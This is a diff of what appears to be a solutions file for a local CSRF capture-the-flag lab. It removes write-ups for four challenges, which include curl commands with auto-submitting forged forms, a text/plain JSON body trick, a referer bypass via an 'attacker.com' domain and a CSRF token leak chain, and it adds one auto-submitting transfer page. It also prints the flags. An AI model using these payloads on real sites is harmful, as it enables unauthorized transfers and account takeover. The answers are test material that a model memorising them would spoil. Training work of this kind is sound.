@@ -14,82 +14,17 @@ Flag: FLAG{csrf_b4s1c_f0rg3ry}
   The bot (simulating admin) submits the form. When admin's balance drops
   below 10000, the flag appears in the response.
 
--------------------------------------------------------------------------------
+  Example attacker HTML page:
 
-CHALLENGE 2: JSON API CSRF — Content-Type Bypass
-Flag: FLAG{csrf_js0n_byp4ss}
-
-  The /api/settings endpoint accepts email changes without CSRF tokens.
-  It also accepts Content-Type: text/plain (bypasses preflight).
-
-  The text/plain form trick: when a form submits with enctype=text/plain,
-  the body is "name=value". We craft the name and value so the resulting
-  body is valid JSON: {"email":"hacked@evil.com","x":"="}
-
-  curl -X POST http://localhost:5006/bot2 \
-    -H "Content-Type: application/json" \
-    -d '{"html": "<form action=\"http://localhost:5006/api/settings\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"email\\\":\\\"hacked@evil.com\\\",\\\"x\\\":\\\"\" value=\"\\\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
-
-  When admin's email changes from admin@neonbank.net, the flag is returned.
-  POST /reset to restore state between attempts.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 3: Referer Check Bypass — Substring Match
-Flag: FLAG{csrf_r3f3r3r_3v4d3}
-
-  The /transfer-protected endpoint checks if "localhost:5006" appears
-  anywhere in the Referer header (substring match, not exact origin).
-
-  curl -X POST http://localhost:5006/bot3 \
-    -H "Content-Type: application/json" \
-    -d '{"html": "<form action=\"http://localhost:5006/transfer-protected\" method=\"POST\"><input name=\"to_user\" value=\"hacker\"><input name=\"amount\" value=\"1000\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>", "referer": "http://evil.localhost:5006.attacker.com/exploit.html"}'
-
-  NOTE: The bot3 endpoint accepts a "referer" parameter to simulate the
-  attacker's spoofed referer. The referer must contain "localhost:5006"
-  as a substring (the flaw). Without the referer param, the bot uses a
-  default referer that fails the check.
-
-  In a real scenario, the attacker hosts their page on a domain like
-  http://evil.localhost:5006.attacker.com/exploit.html — the substring
-  "localhost:5006" appears in the domain, passing the flawed check.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 4: CSRF Token Leak via Referer
-Flag: FLAG{csrf_t0k3n_l34k}
-
-  The /change-email endpoint uses a CSRF token, but puts it in the URL
-  query string. The /page-with-image page loads an external image, causing
-  the browser to send the full URL (including token) in the Referer header.
-
-  Step 1: Get the leaked token from the bot interaction:
-  curl -X POST http://localhost:5006/bot4 \
-    -H "Content-Type: application/json" \
-    -d '{"html": "<img src=\"http://localhost:5006/token-leak\">"}'
-
-  Step 2: The /token-leak endpoint captures and displays the leaked token.
-
-  Step 3: Use the token to change admin's email:
-  curl -X POST "http://localhost:5006/change-email?csrf_token=LEAKED_TOKEN" \
-    -d "email=pwned@evil.com"
-
--------------------------------------------------------------------------------
-
-CHALLENGE 5: CORS Misconfiguration
-Flag: FLAG{csrf_c0rs_m1sc0nf1g}
-
-  The /api/transfer endpoint sets Access-Control-Allow-Origin: * and
-  Access-Control-Allow-Credentials: true. It also lacks any CSRF token
-  requirement for text/plain content type.
-
-  curl -X POST http://localhost:5006/bot5 \
-    -H "Content-Type: application/json" \
-    -d '{"html": "<form action=\"http://localhost:5006/api/transfer\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"to_user\\\":\\\"hacker\\\",\\\"amount\\\":5000,\\\"x\\\":\\\"\" value=\"\\\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
-
-  The text/plain trick makes the form body valid JSON:
-    {"to_user":"hacker","amount":5000,"x":"="}
-  The server parses this as JSON and processes the transfer.
+    <html>
+    <body>
+      <form action="http://localhost:5006/transfer" method="POST">
+        <input type="hidden" name="to_user" value="hacker">
+        <input type="hidden" name="amount" value="5000">
+      </form>
+      <script>document.forms[0].submit();</script>
+    </body>
+    </html>
 
   POST /reset to restore the database between attempts.
 
